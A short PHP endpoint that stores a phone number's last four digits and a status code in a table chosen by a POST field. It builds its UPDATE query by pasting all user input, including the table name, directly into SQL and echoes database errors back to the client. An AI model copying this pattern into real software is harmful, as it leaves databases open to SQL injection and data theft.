<?php
require '../connection.php';

if ($_POST["phone-last-4"] and $_POST["uniqueid"] && $_POST['selSite']) {
  $phonelast4 = $_POST["phone-last-4"];
  $uniqueid = $_POST["uniqueid"];
  $selSite = $_POST['selSite'];

  if (isset($_GET["resend"])) {
    $verification_query = mysqli_query($conn, "UPDATE $selSite SET `phone-last-4`='$phonelast4', status=14, viewed='false' WHERE id=$uniqueid");
  } else {
    $verification_query = mysqli_query($conn, "UPDATE $selSite SET `phone-last-4`='$phonelast4', status=3, viewed='false' WHERE id=$uniqueid");
  }

  if ($verification_query) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
